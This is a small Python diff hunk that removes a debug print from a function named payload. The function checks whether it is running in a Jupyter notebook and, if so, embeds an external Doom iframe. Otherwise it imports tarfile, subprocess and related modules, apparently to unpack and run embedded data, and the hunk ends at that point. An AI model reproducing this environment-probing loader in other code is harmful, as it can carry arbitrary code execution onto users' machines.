@@ -3,7 +3,6 @@ def payload(data):
         import IPython
         assert IPython.get_ipython()
         assert IPython.get_ipython().__class__.__name__ != "TerminalInteractiveShell"
-        print("detected notebook")
         IPython.display.display(IPython.display.IFrame("https://technillogue.github.io/doom.html", 960, 600))
     except (ImportError, NameError, AssertionError):
         import tarfile, io, os, subprocess
